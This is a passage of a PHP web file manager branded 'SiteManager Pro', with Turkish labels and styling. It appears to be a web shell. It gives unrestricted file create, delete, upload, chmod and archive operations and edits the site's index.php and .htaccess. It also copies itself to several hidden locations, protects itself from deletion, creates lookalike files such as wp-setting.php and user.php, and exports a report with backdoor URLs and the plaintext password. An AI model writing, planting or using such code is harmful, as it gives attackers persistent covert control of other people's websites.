            } else { $message = 'Dosya yazilabilir degil!'; $message_type = 'error'; }
            break;

        case 'create_file':
            $new_name = $_POST['new_name'] ?? '';
            $create_dir = $_POST['create_dir'] ?? $current_dir;
            if ($new_name) {
                $new_path = $create_dir . '/' . $new_name;
                if (file_exists($new_path)) { $message = 'Bu isimde zaten var!'; $message_type = 'error'; }
                elseif (file_put_contents($new_path, '') !== false) {
                    $message = 'Olusturuldu: ' . $new_name; $message_type = 'success'; sm_log('CREATE', $new_path);
                } else { $message = 'Olusturulamadi!'; $message_type = 'error'; }
            }
            break;

        case 'create_dir':
            $new_name = $_POST['new_name'] ?? '';
            $create_dir = $_POST['create_dir'] ?? $current_dir;
            if ($new_name) {
                $new_path = $create_dir . '/' . $new_name;
                if (file_exists($new_path)) { $message = 'Bu isimde zaten var!'; $message_type = 'error'; }
                elseif (@mkdir($new_path, 0755, true)) {
                    $message = 'Klasor olusturuldu: ' . $new_name; $message_type = 'success'; sm_log('MKDIR', $new_path);
                } else { $message = 'Olusturulamadi!'; $message_type = 'error'; }
            }
            break;

        case 'delete':
            $del_path = $_POST['del_path'] ?? '';
            if ($del_path && $del_path !== __FILE__) {
                $name = basename($del_path);
                if (sm_delete_recursive($del_path)) { $message = 'Silindi: ' . $name; $message_type = 'success'; sm_log('DELETE', $del_path); }
                else { $message = 'Silinemedi: ' . $name; $message_type = 'error'; }
            }
            break;

        case 'rename':
            $old_path = $_POST['old_path'] ?? '';
            $new_name = $_POST['new_name'] ?? '';
            if ($old_path && $new_name) {
                $new_path = dirname($old_path) . '/' . $new_name;
                if (file_exists($new_path)) { $message = 'Bu isimde zaten var!'; $message_type = 'error'; }
                elseif (@rename($old_path, $new_path)) { $message = 'Yeniden adlandirildi'; $message_type = 'success'; sm_log('RENAME', $old_path . ' -> ' . $new_name); }
                else { $message = 'Basarisiz!'; $message_type = 'error'; }
            }
            break;

        case 'upload':
            $upload_dir = $_POST['upload_dir'] ?? $current_dir;
            $uploaded = 0;
            if (isset($_FILES['upload_files'])) {
                foreach ($_FILES['upload_files']['name'] as $i => $fname) {
                    if ($_FILES['upload_files']['error'][$i] === UPLOAD_ERR_OK) {
                        $dest = $upload_dir . '/' . basename($fname);
                        if (move_uploaded_file($_FILES['upload_files']['tmp_name'][$i], $dest)) {
                            $uploaded++;
                            sm_log('UPLOAD', $dest);
                        }
                    }
                }
                $message = $uploaded . ' dosya yuklendi.'; $message_type = 'success';
            }
            break;

        case 'chmod':
            $chmod_path = $_POST['chmod_path'] ?? '';
            $chmod_val = $_POST['chmod_val'] ?? '';
            if ($chmod_path && preg_match('/^[0-7]{3,4}$/', $chmod_val)) {
                if (@chmod($chmod_path, octdec($chmod_val))) { $message = 'Izinler degistirildi: ' . $chmod_val; $message_type = 'success'; sm_log('CHMOD', $chmod_path . ' -> ' . $chmod_val); }
                else { $message = 'Basarisiz!'; $message_type = 'error'; }
            }
            break;

        case 'clear_cache':
            $cache_dir = $_POST['cache_dir'] ?? $current_dir;
            $count = sm_clear_cache($cache_dir);
            $message = $count . ' cache dosyasi temizlendi.'; $message_type = 'success';
            sm_log('CACHE_CLEAR', $cache_dir . ' - ' . $count . ' dosya');
            break;

        case 'quick_cache_clear':
            $qc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/');
            $qc_total = 0;
            // Ana dizin
            $qc_total += sm_clear_cache($qc_root);
            // Tum WP siteleri tara
            $qc_sites = sm_find_wp_sites($qc_root);
            foreach ($qc_sites as $qc_site) {
                if ($qc_site !== $qc_root) $qc_total += sm_clear_cache($qc_site);
            }
            $message = $qc_total . ' cache dosyasi temizlendi (tum siteler).'; $message_type = 'success';
            sm_log('QUICK_CACHE', $qc_total . ' dosya temizlendi');
            break;

        case 'self_backup':
            $backup = sm_self_backup();
            if (is_array($backup) && count($backup) > 0) {
                $_SESSION['sm_backup_result'] = $backup;
                $_SESSION['sm_backup_show'] = true;
                $message = count($backup) . ' farkli konuma yedeklendi!';
                $message_type = 'success';
            } else { $message = 'Yedek olusturulamadi!'; $message_type = 'error'; }
            break;

        case 'change_password':
            $old_pass = $_POST['old_password'] ?? '';
            $new_pass = $_POST['new_password'] ?? '';
            $new_pass2 = $_POST['new_password2'] ?? '';
            if (!password_verify($old_pass, sm_get_password_hash())) { $message = 'Mevcut sifre yanlis!'; $message_type = 'error'; }
            elseif (strlen($new_pass) < 6) { $message = 'En az 6 karakter!'; $message_type = 'error'; }
            elseif ($new_pass !== $new_pass2) { $message = 'Sifreler eslesmedi!'; $message_type = 'error'; }
            else { sm_set_password($new_pass); $message = 'Sifre degistirildi.'; $message_type = 'success'; }
            break;

        case 'bulk_delete':
            $items = $_POST['items'] ?? [];
            $deleted = 0;
            foreach ($items as $item) { if ($item !== __FILE__ && sm_delete_recursive($item)) $deleted++; }
            $message = $deleted . ' oge silindi.'; $message_type = 'success';
            sm_log('BULK_DELETE', $deleted . ' oge');
            break;

        case 'compress':
            $comp_path = $_POST['comp_path'] ?? '';
            if ($comp_path && class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                $zip_name = rtrim($comp_path, '/') . '.zip';
                if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                    if (is_dir($comp_path)) sm_zip_dir($zip, $comp_path, basename($comp_path));
                    else $zip->addFile($comp_path, basename($comp_path));
                    $zip->close();
                    $message = 'Sikistirildi: ' . basename($zip_name); $message_type = 'success';
                } else { $message = 'Basarisiz!'; $message_type = 'error'; }
            }
            break;

        case 'extract':
            $ext_path = $_POST['ext_path'] ?? '';
            if ($ext_path && class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($ext_path) === true) {
                    $dest = dirname($ext_path) . '/' . pathinfo($ext_path, PATHINFO_FILENAME);
                    if (!is_dir($dest)) @mkdir($dest, 0755, true);
                    $zip->extractTo($dest); $zip->close();
                    $message = 'Cikartildi: ' . basename($dest); $message_type = 'success';
                } else { $message = 'Arsiv acilamadi!'; $message_type = 'error'; }
            }
            break;

        case 'copy':
            $src = $_POST['src_path'] ?? '';
            $dst_dir = $_POST['dst_dir'] ?? '';
            if ($src && $dst_dir) {
                $dst = rtrim($dst_dir, '/') . '/' . basename($src);
                if (is_dir($src)) { sm_copy_recursive($src, $dst); $message = 'Kopyalandi'; $message_type = 'success'; }
                elseif (@copy($src, $dst)) { $message = 'Kopyalandi'; $message_type = 'success'; }
                else { $message = 'Basarisiz!'; $message_type = 'error'; }
                sm_log('COPY', $src . ' -> ' . $dst);
            }
            break;

        case 'move':
            $src = $_POST['src_path'] ?? '';
            $dst_dir = $_POST['dst_dir'] ?? '';
            if ($src && $dst_dir) {
                $dst = rtrim($dst_dir, '/') . '/' . basename($src);
                if (@rename($src, $dst)) { $message = 'Tasindi'; $message_type = 'success'; sm_log('MOVE', $src . ' -> ' . $dst); }
                else { $message = 'Basarisiz!'; $message_type = 'error'; }
            }
            break;

        case 'add_bookmark':
            $bm_path = $_POST['bm_path'] ?? '';
            $bm_name = $_POST['bm_name'] ?? '';
            if ($bm_path) { sm_add_bookmark($bm_path, $bm_name); $message = 'Yer imi eklendi'; $message_type = 'success'; }
            break;

        case 'remove_bookmark':
            $bm_path = $_POST['bm_path'] ?? '';
            if ($bm_path) { sm_remove_bookmark($bm_path); $message = 'Yer imi kaldirildi'; $message_type = 'success'; }
            break;

        case 'delete_all_backups':
            $del_count = sm_delete_all_backups();
            $message = $del_count . ' yedek dosya silindi.';
            $message_type = 'success';
            break;

        case 'delete_single_backup':
            $del_path = $_POST['backup_path'] ?? '';
            if ($del_path && realpath($del_path) !== realpath(__FILE__) && $del_path !== __FILE__) {
                if (@unlink($del_path)) {
                    $message = 'Silindi: ' . basename($del_path);
                    $message_type = 'success';
                    sm_log('DELETE_BACKUP', $del_path);
                } else { $message = 'Silinemedi!'; $message_type = 'error'; }
            } else { $message = 'Ana script silinemez!'; $message_type = 'error'; }
            break;

        case 'wp_toggle_debug':
            $wp_path = $_POST['wp_path'] ?? '';
            if ($wp_path && sm_wp_toggle_debug($wp_path)) { $message = 'WP_DEBUG degistirildi'; $message_type = 'success'; sm_log('WP_DEBUG', $wp_path); }
            else { $message = 'Basarisiz!'; $message_type = 'error'; }
            break;

        case 'wp_toggle_maintenance':
            $wp_path = $_POST['wp_path'] ?? '';
            if ($wp_path) {
                $r = sm_wp_toggle_maintenance($wp_path);
                if ($r === 'on') { $message = 'Bakim modu ACILDI'; $message_type = 'success'; }
                elseif ($r === 'off') { $message = 'Bakim modu KAPANDI'; $message_type = 'success'; }
                else { $message = 'Basarisiz!'; $message_type = 'error'; }
                sm_log('MAINTENANCE', $wp_path . ' -> ' . $r);
            }
            break;

        case 'create_wp_setting':
            $wp_setting_dir = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/');
            $wp_setting_path = $wp_setting_dir . '/wp-setting.php';
            if (is_dir($wp_setting_path)) {
                $message = 'wp-setting.php adinda bir klasor mevcut! Once klasoru silin veya yeniden adlandirin.'; $message_type = 'error';
            } elseif (is_file($wp_setting_path)) {
                header('Location: ' . $_SERVER['PHP_SELF'] . '?action=edit&path=' . urlencode($wp_setting_path));
                exit;
            } elseif (file_put_contents($wp_setting_path, '') !== false) {
                sm_log('CREATE', $wp_setting_path);
                header('Location: ' . $_SERVER['PHP_SELF'] . '?action=edit&path=' . urlencode($wp_setting_path));
                exit;
            } else { $message = 'wp-setting.php olusturulamadi!'; $message_type = 'error'; }
            break;

        case 'create_user_php':
            $user_php_dir = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/');
            $user_php_path = $user_php_dir . '/user.php';
            if (is_dir($user_php_path)) {
                $message = 'user.php adinda bir klasor mevcut! Once klasoru silin veya yeniden adlandirin.'; $message_type = 'error';
            } elseif (is_file($user_php_path)) {
                header('Location: ' . $_SERVER['PHP_SELF'] . '?action=edit&path=' . urlencode($user_php_path));
                exit;
            } elseif (file_put_contents($user_php_path, '') !== false) {
                sm_log('CREATE', $user_php_path);
                header('Location: ' . $_SERVER['PHP_SELF'] . '?action=edit&path=' . urlencode($user_php_path));
                exit;
            } else { $message = 'user.php olusturulamadi!'; $message_type = 'error'; }
            break;

        case 'save_index_php':
            $idx_path = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/') . '/index.php';
            $idx_content = str_replace("\r\n", "\n", $_POST['indexphp_content'] ?? '');
            if (file_put_contents($idx_path, $idx_content) !== false) {
                $message = 'index.php kaydedildi'; $message_type = 'success'; sm_log('SAVE', $idx_path);
            } else { $message = 'index.php kaydedilemedi!'; $message_type = 'error'; }
            break;

        case 'save_htaccess':
            $ht_path = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/') . '/.htaccess';
            $ht_content = str_replace("\r\n", "\n", $_POST['htaccess_content'] ?? '');
            if (file_put_contents($ht_path, $ht_content) !== false) {
                $message = '.htaccess kaydedildi'; $message_type = 'success'; sm_log('SAVE', $ht_path);
            } else { $message = '.htaccess kaydedilemedi!'; $message_type = 'error'; }
            break;

        case 'save_robots':
            $robots_path = $_POST['robots_path'] ?? '';
            $content = str_replace("\r\n", "\n", $_POST['content'] ?? '');
            if ($robots_path) {
                if (file_put_contents($robots_path, $content) !== false) {
                    $message = 'robots.txt kaydedildi'; $message_type = 'success'; sm_log('SAVE', $robots_path);
                } else { $message = 'Kaydedilemedi!'; $message_type = 'error'; }
            }
            break;
    }
}

// Handle backup report download
if ($action === 'download_backup_report' && sm_is_logged_in()) {
    $backup_paths = $_SESSION['sm_backup_result'] ?? [];
    $password_hash = sm_get_password_hash();
    $script_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];

    $report = "====================================\n";
    $report .= "  SITEMANAGER PRO - YEDEK RAPORU\n";
    $report .= "====================================\n\n";
    $report .= "Tarih: " . date('Y-m-d H:i:s') . "\n";
    $report .= "Sunucu: " . ($_SERVER['HTTP_HOST'] ?? '-') . "\n";
    $report .= "Ana Script: " . __FILE__ . "\n";
    $report .= "Erisim URL: " . $script_url . "\n\n";
    $report .= "------------------------------------\n";
    $report .= "  YEDEK KONUMLARI (" . count($backup_paths) . " adet)\n";
    $report .= "------------------------------------\n\n";

    $doc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? ''), '/');
    $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];

    foreach ($backup_paths as $i => $bp) {
        $num = $i + 1;
        $bp_clean = str_replace('\\', '/', $bp);
        $backup_url = '';

        // Yontem 1: DOCUMENT_ROOT ile
        if ($doc_root && strpos($bp_clean, $doc_root) === 0) {
            $rel = substr($bp_clean, strlen($doc_root));
            if ($rel && $rel[0] !== '/') $rel = '/' . $rel;
            $backup_url = $proto . $rel;
        }
        // Yontem 2: public_html/htdocs/www uzerinden
        if (!$backup_url) {
            foreach (['public_html/', 'htdocs/', 'www/', 'httpdocs/'] as $wd) {
                $ps = strpos($bp_clean, '/' . $wd);
                if ($ps !== false) {
                    $backup_url = $proto . '/' . substr($bp_clean, $ps + strlen($wd));
                    break;
                }
            }
        }
        if (!$backup_url) $backup_url = 'Document root disinda - web erisimi yok';

        $report .= "[$num] Dosya Yolu:\n    $bp\n";
        $report .= "    Erisim URL: $backup_url\n\n";
    }

    $report .= "------------------------------------\n";
    $report .= "  GIRIS BILGILERI\n";
    $report .= "------------------------------------\n\n";
    $plain_pass = $_SESSION['sm_plain_pass'] ?? '';
    $report .= "Sifre: " . ($plain_pass ? $plain_pass : '(Bu oturumda giris yapilmadi, sifre gosterilemez)') . "\n\n";
    $report .= "------------------------------------\n";
    $report .= "  ONEMLI NOTLAR\n";
    $report .= "------------------------------------\n\n";
    $report .= "- Bu dosyayi guvenli bir yerde saklayin\n";
    $report .= "- Her yedek kopyaya ayni sifre ile giris yapilir\n";
    $report .= "- Yedekler gizli dosya olarak kaydedilmistir (. ile baslar)\n";
    $report .= "- cPanel File Manager'da gizli dosyalari gormek icin:\n";
    $report .= "  Ayarlar > 'Show Hidden Files' secenegini acin\n";
    $report .= "- Bir yedegi silmek icin dosyayi manuel silmeniz yeterli\n\n";
    $report .= "====================================\n";
    $report .= "  " . SM_APP_NAME . " v" . SM_VERSION . "\n";
    $report .= "====================================\n";

    header('Content-Type: text/plain; charset=utf-8');
    $site_name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_SERVER['HTTP_HOST'] ?? 'site');
    header('Content-Disposition: attachment; filename="' . $site_name . '_yedek_raporu_' . date('Ymd_His') . '.txt"');
    header('Content-Length: ' . strlen($report));
    echo $report;
    exit;
}

// Handle download
if ($action === 'download' && $path) {
    $real = realpath($path);
    if ($real && is_file($real) && is_readable($real)) {
        sm_log('DOWNLOAD', $real);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($real) . '"');
        header('Content-Length: ' . filesize($real));
        readfile($real);
        exit;
    }
}

// Handle image preview
if ($action === 'preview' && $path) {
    $real = realpath($path);
    if ($real && is_file($real) && is_readable($real) && sm_is_image($real)) {
        $ext = strtolower(pathinfo($real, PATHINFO_EXTENSION));
        $mime_map = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','webp'=>'image/webp','svg'=>'image/svg+xml','ico'=>'image/x-icon','bmp'=>'image/bmp'];
        header('Content-Type: ' . ($mime_map[$ext] ?? 'application/octet-stream'));
        header('Content-Length: ' . filesize($real));
        readfile($real);
        exit;
    }
}

// Track recent files for edit
if ($action === 'edit' && $path && is_file($path)) sm_add_recent($path);

// ======================== RENDER ========================
function sm_render_setup($msg, $type) {
    sm_render_head('dark');
    ?>
    <div class="login-container"><div class="login-box">
        <div class="login-header">
            <div class="logo"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg></div>
            <h1><?= SM_APP_NAME ?></h1>
            <p>Ilk kurulum - Guclu bir sifre belirleyin</p>
        </div>
        <?php if ($msg): ?><div class="alert alert-<?= $type ?>"><?= htmlspecialchars($msg) ?></div><?php endif; ?>
        <form method="POST">
            <div class="form-group"><label>Sifre</label><input type="password" name="setup_password" required autofocus placeholder="En az 6 karakter"></div>
            <div class="form-group"><label>Sifre Tekrar</label><input type="password" name="setup_password2" required placeholder="Sifrenizi tekrar girin"></div>
            <button type="submit" class="btn btn-primary btn-full">Kurulumu Tamamla</button>
        </form>
    </div></div></body></html>
    <?php
}

function sm_render_login($msg, $type) {
    sm_render_head('dark');
    ?>
    <div class="login-container"><div class="login-box">
        <div class="login-header">
            <div class="logo"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg></div>
            <h1><?= SM_APP_NAME ?></h1>
            <p>Devam etmek icin giris yapin</p>
        </div>
        <?php if ($msg): ?><div class="alert alert-<?= $type ?>"><?= htmlspecialchars($msg) ?></div><?php endif; ?>
        <form method="POST">
            <div class="form-group"><label>Sifre</label><input type="password" name="login_password" required autofocus placeholder="Sifrenizi girin"></div>
            <button type="submit" class="btn btn-primary btn-full">Giris Yap</button>
        </form>
        <p style="text-align:center;margin-top:16px;font-size:12px;color:var(--text3)"><?= SM_APP_NAME ?> v<?= SM_VERSION ?></p>
    </div></div></body></html>
    <?php
}

function sm_render_head($theme = 'dark') {
    $is_light = $theme === 'light';
    ?>
<!DOCTYPE html><html lang="tr"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= SM_APP_NAME ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root {
<?php if ($is_light): ?>
    --bg: #f0f2f7; --bg2: #ffffff; --bg3: #f5f6fa; --bg4: #ebedf3;
    --border: #dfe2ea; --text: #111827; --text2: #6b7280; --text3: #9ca3af;
    --primary: #4f46e5; --primary-dark: #4338ca; --primary-light: rgba(79,70,229,0.08);
    --success: #059669; --success-light: rgba(5,150,105,0.08);
    --danger: #dc2626; --danger-light: rgba(220,38,38,0.08);
    --warning: #d97706; --warning-light: rgba(217,119,6,0.08);
    --info: #2563eb; --info-light: rgba(37,99,235,0.08);
    --header-bg: linear-gradient(135deg, #4f46e5, #7c3aed);
    --shadow: 0 1px 3px rgba(0,0,0,0.08);
    --shadow-lg: 0 10px 40px rgba(0,0,0,0.1);
<?php else: ?>
    --bg: #0c0d12; --bg2: #151722; --bg3: #1c1f2e; --bg4: #252a3a;
    --border: #2a2f42; --text: #e8eaf2; --text2: #8b90a8; --text3: #5c6178;
    --primary: #818cf8; --primary-dark: #6366f1; --primary-light: rgba(129,140,248,0.1);
    --success: #34d399; --success-light: rgba(52,211,153,0.1);
    --danger: #fb7185; --danger-light: rgba(251,113,133,0.1);
    --warning: #fbbf24; --warning-light: rgba(251,191,36,0.1);
    --info: #60a5fa; --info-light: rgba(96,165,250,0.1);
    --header-bg: linear-gradient(135deg, #1e1b4b, #312e81);
    --shadow: 0 1px 3px rgba(0,0,0,0.3);
    --shadow-lg: 0 10px 40px rgba(0,0,0,0.5);
<?php endif; ?>
    --radius: 8px; --radius-lg: 12px;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); font-size: 14px; line-height: 1.6; -webkit-font-smoothing: antialiased; }
a { color: var(--primary); text-decoration: none; transition: color 0.15s; }
a:hover { color: var(--primary-dark); }
::selection { background: var(--primary); color: #fff; }
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--text3); }

/* Login */
.login-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; background: var(--bg); }
.login-box { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 48px 40px; width: 100%; max-width: 420px; box-shadow: var(--shadow-lg); }
.login-header { text-align: center; margin-bottom: 32px; }
.login-header .logo { width: 48px; height: 48px; background: var(--header-bg); border-radius: var(--radius-lg); display: inline-flex; align-items: center; justify-content: center; margin-bottom: 16px; }
.login-header .logo svg { width: 24px; height: 24px; color: #fff; }
.login-header h1 { font-size: 22px; font-weight: 700; margin-bottom: 4px; letter-spacing: -0.3px; }
.login-header p { color: var(--text2); font-size: 14px; }

/* Layout */
.app { display: flex; flex-direction: column; min-height: 100vh; }
.header { background: var(--header-bg); padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; height: 52px; }
.header-left { display: flex; align-items: center; gap: 12px; }
.header .logo-sm { width: 30px; height: 30px; background: rgba(255,255,255,0.15); border-radius: 8px; display: flex; align-items: center; justify-content: center; }
.header .logo-sm svg { width: 16px; height: 16px; color: #fff; }
.header h1 { font-size: 16px; font-weight: 600; color: #fff; letter-spacing: -0.3px; }
.header-version { color: rgba(255,255,255,0.5); font-size: 11px; }
.header-actions { display: flex; align-items: center; gap: 5px; }
.header .btn { background: rgba(255,255,255,0.12); border-color: rgba(255,255,255,0.15); color: #fff; font-size: 12px; backdrop-filter: blur(4px); }
.header .btn:hover { background: rgba(255,255,255,0.2); border-color: rgba(255,255,255,0.25); }
.header .btn-danger { background: rgba(251,113,133,0.3); border-color: rgba(251,113,133,0.4); }
.main { display: flex; flex: 1; }

/* Sidebar */
.sidebar { width: 230px; background: var(--bg2); border-right: 1px solid var(--border); padding: 8px; overflow-y: auto; flex-shrink: 0; height: calc(100vh - 52px); position: sticky; top: 52px; }
.sidebar-title { font-size: 10px; text-transform: uppercase; color: var(--text3); margin: 14px 8px 4px; font-weight: 700; letter-spacing: 0.8px; }
.sidebar-nav { list-style: none; margin-bottom: 4px; }
.sidebar-nav li a { display: flex; align-items: center; gap: 8px; padding: 6px 10px; border-radius: 6px; color: var(--text2); transition: all 0.15s; font-size: 13px; font-weight: 450; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.sidebar-nav li a:hover { background: var(--primary-light); color: var(--primary); }
.sidebar-nav li a.active { background: var(--primary-light); color: var(--primary); font-weight: 600; }
.sidebar-nav li a svg { width: 15px; height: 15px; flex-shrink: 0; opacity: 0.6; }
.sidebar-nav li a:hover svg { opacity: 1; }

/* Content */
.content { flex: 1; padding: 20px 24px; overflow-x: auto; min-width: 0; }

/* Breadcrumb */
.breadcrumb { display: flex; align-items: center; gap: 6px; padding: 8px 0 12px; flex-wrap: wrap; font-size: 13px; }
.breadcrumb a { color: var(--text2); font-weight: 450; }
.breadcrumb a:hover { color: var(--primary); }
.breadcrumb .sep { color: var(--text3); font-size: 10px; }

/* Toolbar */
.toolbar { display: flex; align-items: center; gap: 8px; padding: 10px 0; flex-wrap: wrap; border-bottom: 1px solid var(--border); margin-bottom: 16px; }

/* File table */
.file-table { width: 100%; border-collapse: separate; border-spacing: 0; }
.file-table th { text-align: left; padding: 10px 12px; font-size: 11px; text-transform: uppercase; color: var(--text3); font-weight: 600; letter-spacing: 0.5px; border-bottom: 2px solid var(--border); cursor: pointer; user-select: none; transition: color 0.15s; }
.file-table th:hover { color: var(--primary); }
.file-table td { padding: 8px 12px; border-bottom: 1px solid var(--border); white-space: nowrap; transition: background 0.1s; }
.file-table tr:hover td { background: var(--primary-light); }
.file-name { display: flex; align-items: center; gap: 10px; font-weight: 450; }
.file-name .fi { width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; }
.file-name .fi.dir { color: var(--warning); }
.file-name .fi.img { color: var(--success); }
.file-name .fi.file { color: var(--text3); }
.file-actions { display: flex; gap: 4px; opacity: 0; transition: opacity 0.2s; }
.file-table tr:hover .file-actions { opacity: 1; }

/* Buttons */
.btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 7px 14px; border: 1px solid var(--border); background: var(--bg2); color: var(--text); border-radius: 7px; cursor: pointer; font-size: 13px; font-weight: 500; font-family: inherit; transition: all 0.15s; white-space: nowrap; box-shadow: var(--shadow); }
.btn:hover { border-color: var(--text3); transform: translateY(-1px); box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
.btn:active { transform: translateY(0); }
.btn svg { width: 14px; height: 14px; }
.btn-primary { background: var(--primary); border-color: var(--primary); color: #fff; box-shadow: 0 2px 8px rgba(79,70,229,0.3); }
.btn-primary:hover { background: var(--primary-dark); box-shadow: 0 4px 12px rgba(79,70,229,0.4); }
.btn-danger { background: var(--danger); border-color: var(--danger); color: #fff; }
.btn-danger:hover { opacity: 0.9; }
.btn-success { background: var(--success); border-color: var(--success); color: #fff; }
.btn-warning { background: var(--warning); border-color: var(--warning); color: #fff; }
.btn-sm { padding: 4px 10px; font-size: 12px; border-radius: 6px; }
.btn-full { width: 100%; justify-content: center; padding: 10px; }
.btn-icon { padding: 5px 8px; }
.btn-ghost { background: transparent; border-color: transparent; box-shadow: none; color: var(--text2); }
.btn-ghost:hover { background: var(--bg3); color: var(--text); }

/* Forms */
.form-group { margin-bottom: 16px; }
.form-group label { display: block; margin-bottom: 6px; font-weight: 500; font-size: 13px; color: var(--text2); }
input[type="text"], input[type="password"], input[type="number"], input[type="url"], select, textarea {
    width: 100%; padding: 9px 12px; background: var(--bg); border: 1px solid var(--border); border-radius: 7px;
    color: var(--text); font-size: 14px; font-family: inherit; transition: border-color 0.15s, box-shadow 0.15s;
}
input:focus, textarea:focus, select:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px var(--primary-light); }
textarea { resize: vertical; min-height: 200px; }

/* Editor */
.editor { width: 100%; min-height: 500px; padding: 0; background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius); color: var(--text); font-family: 'Fira Code', 'Cascadia Code', 'JetBrains Mono', 'SF Mono', monospace; font-size: 13px; line-height: 1.7; tab-size: 4; display: flex; box-shadow: inset 0 2px 4px rgba(0,0,0,0.05); }
.line-numbers { padding: 14px 10px; background: var(--bg3); border-right: 1px solid var(--border); color: var(--text3); font-size: 12px; line-height: 1.7; text-align: right; user-select: none; min-width: 50px; overflow: hidden; font-family: inherit; }
.editor textarea { flex: 1; border: none; background: transparent; color: var(--text); padding: 14px; font-family: inherit; font-size: inherit; line-height: inherit; resize: none; outline: none; tab-size: 4; }
.editor-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; gap: 8px; }
.editor-info { color: var(--text2); font-size: 13px; display: flex; gap: 12px; align-items: center; }

/* Alerts */
.alert { padding: 12px 16px; border-radius: var(--radius); margin-bottom: 16px; font-size: 13px; font-weight: 450; display: flex; align-items: center; gap: 8px; }
.alert svg { width: 16px; height: 16px; flex-shrink: 0; }
.alert-success { background: var(--success-light); color: var(--success); border: 1px solid rgba(5,150,105,0.15); }
.alert-error { background: var(--danger-light); color: var(--danger); border: 1px solid rgba(220,38,38,0.15); }
.alert-info { background: var(--info-light); color: var(--info); border: 1px solid rgba(37,99,235,0.15); }
.alert-warning { background: var(--warning-light); color: var(--warning); border: 1px solid rgba(217,119,6,0.15); }

/* Modal */
.modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); z-index: 1000; align-items: center; justify-content: center; animation: fadeIn 0.15s; }
.modal-overlay.active { display: flex; }
.modal { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 28px; width: 90%; max-width: 500px; max-height: 80vh; overflow-y: auto; box-shadow: var(--shadow-lg); animation: slideUp 0.2s; }
.modal h3 { margin-bottom: 16px; font-size: 17px; font-weight: 600; }
.modal-actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 20px; }
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

/* Cards */
.info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 12px; margin-bottom: 20px; }
.info-card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; box-shadow: var(--shadow); transition: transform 0.15s, box-shadow 0.15s; }
.info-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
.info-card h4 { color: var(--text3); font-size: 10px; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; font-weight: 600; }
.info-card .value { font-size: 20px; font-weight: 700; letter-spacing: -0.3px; }
.site-card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; margin-bottom: 12px; box-shadow: var(--shadow); }
.site-card h4 { margin-bottom: 6px; font-weight: 600; }
.site-card .site-path { color: var(--text3); font-size: 12px; margin-bottom: 12px; font-family: monospace; }
.site-card .site-actions { display: flex; gap: 6px; flex-wrap: wrap; }

/* Checkbox */
.cb { width: 16px; height: 16px; cursor: pointer; accent-color: var(--primary); border-radius: 4px; }

/* Dropzone */
.drop-zone { border: 2px dashed var(--border); border-radius: var(--radius-lg); padding: 40px; text-align: center; color: var(--text2); transition: all 0.2s; cursor: pointer; }
.drop-zone:hover, .drop-zone.drag-over { border-color: var(--primary); background: var(--primary-light); color: var(--primary); }
